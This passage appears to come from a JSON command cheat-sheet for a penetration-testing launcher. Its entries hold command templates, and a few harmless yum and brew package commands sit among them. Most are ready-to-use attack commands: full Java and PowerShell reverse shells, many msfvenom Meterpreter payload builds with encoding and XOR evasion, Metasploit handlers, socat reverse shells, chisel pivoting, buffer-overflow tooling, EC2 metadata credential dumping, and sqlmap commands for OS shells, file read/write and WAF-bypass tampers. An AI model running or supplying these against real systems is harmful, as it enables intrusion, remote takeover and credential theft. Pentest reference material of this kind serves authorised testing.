\"reverse\"]", "more_info_url": null}, {"name": "[[java]] reverse shell", "description": "", "executable_type": "custom", "executable_path": "r", "arguments": "= Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/<lhost>/<lport>;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);p.waitFor()", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "[[Arsenal/Windows/powershell]] reverse shell", "description": "", "executable_type": "custom", "executable_path": "$client", "arguments": "= New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "windows listener autocompletion", "description": "", "executable_type": "custom", "executable_path": "rlwramp", "arguments": "nc -nlvp <port>", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "interactive reverse shell - and Ctrl+Z (1) ", "description": "", "executable_type": "custom", "executable_path": "python", "arguments": "-c 'import pty; pty.spawn(\"/bin/bash\")'", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "interactive reverse shell - on host - and do fg (2)", "description": "", "executable_type": "custom", "executable_path": "stty", "arguments": "raw -echo", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "interactive reverse shell - on reverse (3)", "description": "", "executable_type": "custom", "executable_path": "reset;\\", "arguments": "stty rows <ROWS> cols <COLS>;\\\nexport TERM=xterm-256color", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "msfvenom payloads list", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "--list payloads", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "msfvenom - payload windows x86 meterpeter unstagged", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe > shell.exe", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Linux Meterpreter Reverse Shell", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Linux x64 Meterpreter Reverse tcp", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p  linux/x64/meterpreter/reverse_tcp LHOST=<ip|tun0> LPORT=<port> prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Windows Meterpreter Reverse TCP Shell", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Windows Reverse TCP Shell", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/shell/reverse_tcp LHOST=<ip> LPORT=<local> -f exe > shell.exe", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Windows Encoded Meterpreter Windows Reverse Shell", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<local> -e shikata_ga_nai -i 3 -f exe > encoded.exe", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Mac Reverse Shell", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho > shell.macho", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "meterpreter x64 - https - non staged", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfnonstaged.exe", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "meterpreter x64 - https - staged", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfstaged.exe", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "PHP Meterpreter Reverse TCP", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "ASP Meterpreter Reverse TCP", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > shell.asp", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "JSP Java Meterpreter Reverse TCP", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "WAR", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "VBA 32bits", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f vbapplication", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "powershell 32 bits", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "DLL", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f dll -o <dll|output.dll>", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Python Reverse Shell", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw > shell.py", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Bash Unix Reverse Shell", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > shell.sh", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Perl Unix Reverse shell", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw > shell.pl", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Powershell", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Csharp - xor encrypted", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> --encrypt xor --encrypt-key <key> -f csharp", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Windows Meterpreter Reverse TCP Shellcode", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Linux Meterpreter Reverse TCP Shellcode", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Mac Reverse TCP Shellcode", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <language>", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "MCreate User", "description": "", "executable_type": "custom", "executable_path": "msfvenom", "arguments": "-p windows/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe > adduser.exe", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Metasploit Handler windows tcp 32bits staged", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploits/multi/handler; set lhost <ip>; set lport <port>; set payload windows/meterpreter/reverse_tcp; exploit\"", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Metasploit Handler windows https 32bits staged", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Metasploit Handler windows https 64bits staged", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; exploit\"", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Metasploit - Handler windows https 64bits unstaged", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter_reverse_https; exploit\"", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Metasploit - Handler windows https 64bits stagged - encoded xor", "description": "others encoder : x64/zutto_dekiru", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder <encoder|x64/xor_dynamic>; exploit\"", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "Metasploit - Handler linux tcp 64bits stagged - encoded xor", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit\"", "tags": "[\"msfvenom\", \"reverse shell\"]", "more_info_url": null}, {"name": "bof, pattern creation", "description": "", "executable_type": "custom", "executable_path": "msf-pattern_create", "arguments": "-l <size>", "tags": "[\"bof\", \"buffer overflow\"]", "more_info_url": null}, {"name": "bof, pattern offset", "description": "", "executable_type": "custom", "executable_path": "msf-pattern_offset", "arguments": "-l <size> -q <pattern>", "tags": "[\"bof\", \"buffer overflow\"]", "more_info_url": null}, {"name": "bof, nasm - show opcode from asm", "description": "", "executable_type": "custom", "executable_path": "msf-nasm_shell", "arguments": "#\u00a0nasm > jmp esp", "tags": "[\"bof\", \"buffer overflow\"]", "more_info_url": null}, {"name": "ropgadget - Specify a binary filename to analyze", "description": "", "executable_type": "custom", "executable_path": "ROPgadget", "arguments": "--binary <binary>", "tags": "[\"bof\", \"ropgadget\"]", "more_info_url": null}, {"name": "ropgagdet - Enable the ROP chain generation", "description": "", "executable_type": "custom", "executable_path": "ROPgadget", "arguments": "--binary <binary> --ropchain", "tags": "[\"bof\", \"ropgadget\"]", "more_info_url": null}, {"name": "ropgagdet - Search opcode in executable segment", "description": "", "executable_type": "custom", "executable_path": "ROPgadget", "arguments": "--binary <binary> --opcode <opcode>", "tags": "[\"bof\", \"ropgadget\"]", "more_info_url": null}, {"name": "ropgadget - Search string between two addresses (0x...-0x...)", "description": "", "executable_type": "custom", "executable_path": "ROPgadget", "arguments": "--binary <binary> --string <string> --range <start_address>-<end_address>", "tags": "[\"bof\", \"ropgadget\"]", "more_info_url": null}, {"name": "ropgadget - Only show specific instructions", "description": "", "executable_type": "custom", "executable_path": "ROPgadget", "arguments": "--binary <binary> --only=\"<instructions>\"", "tags": "[\"bof\", \"ropgadget\"]", "more_info_url": null}, {"name": "ropgadget - Suppress specific mnemonics", "description": "", "executable_type": "custom", "executable_path": "ROPgadget", "arguments": "--binary <binary> --filter=\"<instructions>\"", "tags": "[\"bof\", \"ropgadget\"]", "more_info_url": null}, {"name": "mona - Show all loaded modules and their properties", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "modules", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Configure the log directory (no need to create it)", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "config -set workingfolder <path|c:\\logs\\%p>", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Verify the current the log directory", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "config -get workingfolder", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Create a cyclic pattern of a given size", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "pc <pattern_size|400>", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Find cyclic pattern in memory", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "findmsp", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Find location (offset) of 4 bytes in a cyclic pattern", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "po <pattern_value|41346541>", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Find bytes in memory (ex: eggs)", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "find -s <pattern_value|\"w00tw00t\">", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Find pointers that will allow you to jump to a register (without null bytes)", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "jmp -r <reg_name|esp> -n", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Find a function in IAT", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "getiat -s <function_name|*strcpy*>", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Show the current SEH chain", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "sehchain", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Set a breakpoint on all current SEH Handler function pointers", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "bpseh", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Find pointers to assist with SEH overwrite exploits (default: no aslr, no rebase, no safeseh)", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "seh", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Badchar hunting step 1 - Creates a byte array", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "bytearray -cpb <excluded_bytes|'\\x00\\x0a\\x0d'>", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Badchar hunting step 3 - compare until \"!!! Hooray, normal shellcode unmodified !!!\" message", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "compare -f <input_file|C:\\BadChars\\bytearray.bin> -a <bytesarray_address|esp>", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Finds gadgets that can be used in a ROP exploit and do ROP magic with them (Note : can take 20 minutes)", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "rop -cm aslr=false,rebase=false", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Finds stackpivots (move stackpointer to controlled area)", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "stackpivot -cm os=true -distance <min,max|12,12>", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "mona - Show pointers to pointers to the pattern (might take a while !)", "description": "", "executable_type": "custom", "executable_path": "!mona", "arguments": "find -type file -s <input_file|C:\\stackpivot.txt> -p2p", "tags": "[\"bof\", \"mona\"]", "more_info_url": null}, {"name": "socat port forwarding listener (on local machine)", "description": "", "executable_type": "custom", "executable_path": "./socat", "arguments": "TCP-LISTEN:<port_listener|4444>,fork,reuseaddr TCP-LISTEN:<port_to_forward>", "tags": "[\"socat\"]", "more_info_url": null}, {"name": "socat port forwarding connect (on remote machine)", "description": "", "executable_type": "custom", "executable_path": "./socat", "arguments": "TCP:<connect_ip>:<connect_port|4444> TCP:127.0.0.1:<port_to_forward>", "tags": "[\"socat\"]", "more_info_url": null}, {"name": "socat reverse shell (remote victime)", "description": "", "executable_type": "custom", "executable_path": "./socat", "arguments": "exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listner_ip>:<listner_port|4444>", "tags": "[\"socat\"]", "more_info_url": null}, {"name": "socat reverse shell listener (local)", "description": "", "executable_type": "custom", "executable_path": "socat", "arguments": "file:`tty`,raw,echo=0 tcp-listen:<listner_port|4444>", "tags": "[\"socat\"]", "more_info_url": null}, {"name": "chisel server (server on local machine)", "description": "All commands on arsenal are done with server on kali machine and client on the target.\nClient or Server can also be launch on windows with chisel.exe", "executable_type": "custom", "executable_path": "./chisel", "arguments": "server -v -p <server_port|8000> --reverse", "tags": "[\"chisel\"]", "more_info_url": null}, {"name": "chisel reverse port forwarding (client on remote machine) - forward client port on server", "description": "This forward {clientside-host}:{clientside-port} to server {local-port}\nTo get the port of the client machine locally on serverside.\nex: R:2222:localhost:22 to get the client 22 (ssh) on the port 2222 of the server\n| server | - 2222 <-----  |client|-127.0.0.1:22\non server : ssh -p 2222 127.0.0.1", "executable_type": "custom", "executable_path": "./chisel", "arguments": "client -v <server_ip>:<server_port|8000> R:<serverside-port>:<clientside-host|localhost>:<clientside-port>", "tags": "[\"chisel\"]", "more_info_url": null}, {"name": "chisel remote port forwarding (client on remote machine) - forward server port on client", "description": "To expose server port remotely (useful to expose your listener)\nThis forward {serverside-host}:{serverside-port} from the server to {clientside-host}:{clientside-port}\nex : 0.0.0.0:4445:127.0.0.1:4444 expose the server 4444 listener to client 4445\n| server | - 4444 ------->  |client|-4445 : *   <-", "executable_type": "custom", "executable_path": "./chisel", "arguments": "client -v <server_ip>:<server_port|8000> <clientside-host|0.0.0.0>:<clientside-port>:<serverside-host|127.0.0.1>:<serverside-port>", "tags": "[\"chisel\"]", "more_info_url": null}, {"name": "chisel socks proxy (client on remote machine)", "description": "If the server is launch with --reverse you can specify R: socks to get a proxy socks on server machine (port 1080)\nOn server with proxychains set on port 1080 you can proxy socks request on the client.", "executable_type": "custom", "executable_path": "./chisel", "arguments": "client <server_ip>:<server_port> R:socks", "tags": "[\"chisel\"]", "more_info_url": null}, {"name": "ip infos (hostname / city / country / isp )", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "https://ipinfo.io/<ip>", "tags": "[\"network\", \"ip\"]", "more_info_url": null}, {"name": "what is my ip", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "https://ipinfo.io/", "tags": "[\"network\", \"ip\"]", "more_info_url": null}, {"name": "what is my ip - plaintext", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "https://ipecho.net/plain/", "tags": "[\"network\", \"ip\"]", "more_info_url": null}, {"name": "test an internet port out allow - curl (no 445)", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "portquiz.net:<port>", "tags": "[\"network\", \"portquiz\"]", "more_info_url": null}, {"name": "test an internet port out allow - nc (no 445)", "description": "", "executable_type": "custom", "executable_path": "nc", "arguments": "-v portquiz.net <port>", "tags": "[\"network\", \"portquiz\"]", "more_info_url": null}, {"name": "SSRF in EC2 - List roles", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "tags": "[\"aws\"]", "more_info_url": null}, {"name": "SSRF in EC2 - Dump roles", "description": "", "executable_type": "custom", "executable_path": "curl", "arguments": "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>", "tags": "[\"aws\"]", "more_info_url": null}, {"name": "List all available packages", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "list available", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "List all installed packages", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "list installed", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Info about package", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "info <package-name>", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Search in repository (packages and descriptions)", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "search <query>", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "List all history actions (install, update and erase)", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "history list", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Check updates for installed packages", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "check-update", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Update all packages", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "update", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Update spesific/individual package", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "update <package-name>", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Downgrade package", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "downgrade <package-name>", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Install a package from repository", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "install <package-name>", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Remove/delete package", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "remove <package-name>", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Install local rpm package", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "localinstall <filepath-rpm>", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Install security updates", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "update --security", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "List dependencies of package", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "deplist <package-name>", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Remove un-needed packages and dependencies", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "autoremove", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "Whatprovides package/file/binary", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "whatprovides <query>", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "List currently enabled repositories", "description": "", "executable_type": "custom", "executable_path": "yum", "arguments": "repolist", "tags": "[\"yum\"]", "more_info_url": null}, {"name": "update brew", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "update", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "upgrade brew", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "upgrade", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "get info for a package", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "info <package>", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "get info for a cask", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "cask info <casks>", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "install a package", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "install <package>", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "install a cask", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "cask install <casks>", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "uninstall a package", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "uninstall <installed>", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "uninstall a cask", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "cask uninstall <caskinstalled>", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "edit package", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "edit <package>", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "edit cask", "description": "", "executable_type": "custom", "executable_path": "brew", "arguments": "cask edit <casks>", "tags": "[\"mac\", \"install\"]", "more_info_url": null}, {"name": "basic sqlmap step 1", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -p <arguments> --dbs", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "basic sqlmap step 2", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -p <arguments> --dbms=<database_type>", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "basic sqlmap step 3", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -p <arguments> --dbms=<database_type> -D <database_name> --tables", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "basic sqlmap step 4", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> --columns", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "basic sqlmap step 5", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> -C <columns> --dump", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - list dbs", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> --dbs", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - list tables", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -D <db> --tables", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - dump a table", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -D <db> -T <table> --dump", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - list columns of a table", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -D <db> -T <table> --columns", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - dump only some tables columns", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -D <db> -T <table> -C <c1>,<c2> --dump", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - get shell", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> --os-shell", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - file read", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> --file-read=<remote_file>", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - file write", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> --file-write=<local_file> --file-dest=<remote_path_destination>", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - classic get", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url>", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - classic post", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> -d \"<params>\"", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - get with cookie", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> --cookie=<cookie>", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - use file", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-r <request_file>", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - classic with tamper", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u '<url>' tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - hardcore", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u '<url>' --level=5 --risk=3 -p '<parameter>' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - mysql tamper list", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> --dbms=MYSQL tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes", "tags": "[\"sql injection\"]", "more_info_url": null}, {"name": "sqlmap - mssql tamper list", "description": "", "executable_type": "custom", "executable_path": "sqlmap", "arguments": "-u <url> --dbms=MSSQL 